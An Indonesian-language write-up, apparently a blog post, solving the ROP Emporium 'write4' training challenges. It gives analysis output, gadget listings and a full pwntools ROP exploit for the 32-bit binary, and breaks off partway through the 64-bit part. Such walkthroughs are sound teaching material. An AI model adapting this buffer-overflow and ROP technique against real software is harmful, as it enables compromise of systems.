</code></pre></td></tr></table></div></div><p>[Created at: February 13, 2021]</p><h1 id=write4>write4<a hidden class=anchor aria-hidden=true href=#write4>#</a></h1><table><thead><tr><th>File</th><th>Download</th></tr></thead><tbody><tr><td><a href=#write432>write432</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/write432/write432>klik</a></td></tr><tr><td><a href=#write4>write4</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/write4/write4>klik</a></td></tr></tbody></table><h3 id=write432>write432<a hidden class=anchor aria-hidden=true href=#write432>#</a></h3><p>Kita cek terlebih filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file write432
write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
</code></pre></td></tr></table></div></div><p>Lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec write432
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b&#39;.&#39; 
</code></pre></td></tr></table></div></div><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x08048500  frame_dummy
0x08048506  main
0x0804852a  usefulFunction
0x08048543  usefulGadgets
0x08048550  __libc_csu_init
0x080485b0  __libc_csu_fini
0x080485b4  _fini
</code></pre></td></tr></table></div></div><p>Kita coba lakukan disassembly fungsi <em><strong>main</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
   0x08048513 &lt;+13&gt;:	push   ecx
   0x08048514 &lt;+14&gt;:	sub    esp,0x4
   0x08048517 &lt;+17&gt;:	call   0x80483b0 &lt;pwnme@plt&gt;
...
...
...
</code></pre></td></tr></table></div></div><p>Pada fungsi <em><strong>main</strong></em> memanggil <em><strong>pwnme</strong></em><br>Kita lakukan disassembly fungsinya</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas 0x80483b0
Dump of assembler code from 0x80483b0 to 0x80483d0::	Dump of assembler code from 0x80483b0 to 0x80483d0:
   0x080483b0 &lt;pwnme@plt+0&gt;:	jmp    DWORD PTR ds:0x804a00c
   0x080483b6 &lt;pwnme@plt+6&gt;:	push   0x0
   0x080483bb &lt;pwnme@plt+11&gt;:	jmp    0x80483a0
   0x080483c0 &lt;__libc_start_main@plt+0&gt;:	jmp    DWORD PTR ds:0x804a010
   0x080483c6 &lt;__libc_start_main@plt+6&gt;:	push   0x8
   0x080483cb &lt;__libc_start_main@plt+11&gt;:	jmp    0x80483a0
End of assembler dump.
</code></pre></td></tr></table></div></div><p>Setelah saya analisa ada fungsi yang menurut saya menarik tapi tidak pernah terpanggil. nah menggunakan metode Return Oriented Programming (rop) sebagai solusi.<br>Pada fungsi <em><strong>usefulFunction</strong></em> kita gunakan untuk mencetak flag.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas 0x0804852a
Dump of assembler code from 0x804852a to 0x804854a::	Dump of assembler code from 0x804852a to 0x804854a:
   0x0804852a &lt;usefulFunction+0&gt;:	push   ebp
   0x0804852b &lt;usefulFunction+1&gt;:	mov    ebp,esp
   0x0804852d &lt;usefulFunction+3&gt;:	sub    esp,0x8
   0x08048530 &lt;usefulFunction+6&gt;:	sub    esp,0xc
   0x08048533 &lt;usefulFunction+9&gt;:	push   0x80485d0
   0x08048538 &lt;usefulFunction+14&gt;:	call   0x80483d0 &lt;print_file@plt&gt;
   0x0804853d &lt;usefulFunction+19&gt;:	add    esp,0x10
   0x08048540 &lt;usefulFunction+22&gt;:	nop
   0x08048541 &lt;usefulFunction+23&gt;:	leave  
   0x08048542 &lt;usefulFunction+24&gt;:	ret    
   0x08048543 &lt;usefulGadgets+0&gt;:	mov    DWORD PTR [edi],ebp
   0x08048545 &lt;usefulGadgets+2&gt;:	ret    
   0x08048546 &lt;usefulGadgets+3&gt;:	xchg   ax,ax
   0x08048548 &lt;usefulGadgets+5&gt;:	xchg   ax,ax
End of assembler dump.
</code></pre></td></tr></table></div></div><p>Permasalahannya yaitu tidak ada string &lsquo;/bin/cat flag.txt&rsquo;.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>On completing our usual checks for interesting strings and symbols in this binary we&#39;re confronted with the stark truth that our favourite string &#34;/bin/cat flag.txt&#34; is not present this time.
</code></pre></td></tr></table></div></div><p>Pada fungsi <em><strong>usefulGadgets</strong></em> kita bisa menulis string &lsquo;flag.txt&rsquo;.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas 0x08048543
Dump of assembler code from 0x8048543 to 0x8048563::	Dump of assembler code from 0x8048543 to 0x8048563:
   0x08048543 &lt;usefulGadgets+0&gt;:	mov    DWORD PTR [edi],ebp
   0x08048545 &lt;usefulGadgets+2&gt;:	ret    
...
...
...
</code></pre></td></tr></table></div></div><p>namun yang jadi masalah yaitu apakah ada permissions write pada file ELF tersebut, karena kalau tidak ada permissions tersebut tidak bisa walaupun sudah kita buat string &lsquo;flag.txt&rsquo;. pada arsitektur 32-bit kita menulis nilai sebesar 4 byte.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Section Headers:
 [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
...
...
...
 [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
 [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
 [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
 [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
 [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
 [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
 [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
</code></pre></td></tr></table></div></div><p>ternyata .got.plt .data .bss permissions Write(W), jadi kita bisa mencetak flag.txt.<br>kita cari pop 2 kali</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Gadgets information
============================================================
0x080485ab : pop ebp ; ret
0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804839d : pop ebx ; ret
0x080485aa : pop edi ; pop ebp ; ret
0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 7
</code></pre></td></tr></table></div></div><p>saya gunakan <em><strong>pop edi pop ebp ret</strong></em> karena pada fungsi <em><strong>usefulGadgets</strong></em> nilai register ebp akan dipindahkan ke register edi<br><em><strong>0x08048543 &lt;+0>: mov DWORD PTR [edi],ebp</strong></em><br>Kita buat kode exeploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./write432&#39;)
r = process(&#39;./write432&#39;)
printFlag = p.plt[&#39;print_file&#39;]
gadgets = p.symbols[&#39;usefulGadgets&#39;]
pop_edi_ebp = 0x080485aa
bss = 0x804a020
log.info(&#39;print_flag 0x%x&#39; %printFlag)
log.info(&#39;gadgets 0x%x&#39; %gadgets)
log.info(&#39;pop edi ebp ret 0x%x&#39; %pop_edi_ebp)
log.info(&#39;bss 0x%x&#39; %bss)
junk = b&#39;X&#39;*44
payload = junk
payload += p32(pop_edi_ebp)
payload += p32(bss)
payload += b&#39;flag&#39;
payload += p32(gadgets)
payload += p32(pop_edi_ebp)
payload += p32(bss + 0x4)
payload += b&#39;.txt&#39;
payload += p32(gadgets)
payload += p32(printFlag)
payload += b&#39;Y&#39;*4
payload += p32(bss)
r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><p>Jalankan maka didapatkan flag</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process &#39;./write432&#39; stopped with exit code -11 (SIGSEGV) (pid 12182)
[*] Got EOF while reading in interactive
$  
</code></pre></td></tr></table></div></div><h3 id=write4-1>write4<a hidden class=anchor aria-hidden=true href=#write4-1>#</a></h3><p>Kita cek terlebih filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
</code></pre></td></tr></table></div></div><p>Lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec write4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b&#39;.&#39;
</code></pre></td></tr></table></div></div><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
</code></pre></td></tr></table></div></div><p>Hampir sama dengan binary 64 namun ada sedikit perbedaan pada fungsi <em><strong>usefulGadgets</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 &lt;+0&gt;:	mov    QWORD PTR [r14],r15
   0x000000000040062b &lt;+3&gt;:	ret    
   0x000000000040062c &lt;+4&gt;:	nop    DWORD PTR [rax+0x0]
End of assembler dump.
